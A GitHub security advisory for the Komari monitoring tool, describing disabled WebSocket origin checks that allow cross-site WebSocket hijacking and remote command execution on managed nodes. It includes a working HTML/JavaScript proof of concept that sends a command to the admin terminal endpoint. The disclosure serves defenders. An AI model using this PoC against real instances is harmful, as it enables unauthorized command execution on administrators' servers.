# [H] Komari vulnerable to Cross-site WebSocket Hijacking

## Summary
Severity: High
Advisory: GHSA-q355-h244-969h
CWE: CWE-1385
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-08-12
Source: https://github.com/advisories/GHSA-q355-h244-969h
Type: github-advisory

## Affected
- Go: `github.com/komari-monitor/komari` — affected >=0 <0.0.0-20250809073044-53171affcaf0

## Details
### Summary

WebSocket upgrader has disabled origin checking, enabling Cross-Site WebSocket Hijacking (CSWSH) attacks against authenticated users

### Details

https://github.com/komari-monitor/komari/blob/bd5a6934e1b79a12cf1e6a9bba5372d0e04f3abc/api/terminal.go#L33-L35

Any third party website can send requests to the terminal websocket endpoint with browser's cookies, resulting in remote code execution

### PoC

1. Login in to your komari instance
2. Hosting the following HTML code on internet, replace `<komari-addr>` and `<target-uuid>` into yours
3. Visit this HTML page, you can see your node is executing `uptime` without your actions

```
<pre></pre>
<script>
const socket = new WebSocket("wss://<komari-addr>/api/admin/client/<target-uuid>/terminal");
socket.addEventListener("open", (event) => {
  const binaryBlob = new Blob(['uptime\n'], { type: 'application/octet-stream' });
  socket.send(binaryBlob);
});
socket.addEventListener("message", (event) => {
  event.data.text().then(x => {document.querySelector("pre").append(x)});
});
</script>
```

### Impact

An administrator of a Komari instance will execute commands on their nodes unnoticed when visiting a malware page.

## References
- https://github.com/komari-monitor/komari/security/advisories/GHSA-q355-h244-969h
- https://github.com/komari-monitor/komari/commit/53171affcaf050145810efaaef420651a6e630be
- https://github.com/komari-monitor/komari
- https://github.com/komari-monitor/komari/blob/bd5a6934e1b79a12cf1e6a9bba5372d0e04f3abc/api/terminal.go#L33-L35
- https://github.com/komari-monitor/komari/releases/tag/1.0.4-fix2
